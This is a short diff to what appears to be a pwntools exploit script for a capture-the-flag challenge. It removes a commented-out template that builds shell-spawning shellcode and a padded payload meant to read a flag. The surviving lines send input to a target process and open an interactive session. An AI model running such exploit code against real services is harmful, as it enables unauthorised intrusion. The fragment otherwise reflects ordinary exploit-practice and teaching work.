@@ -63,14 +63,4 @@ for i in range(-1000, -1333, -1):
     io.sendline(b"2")
     log.info(io.recv())
 
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-
 io.interactive()
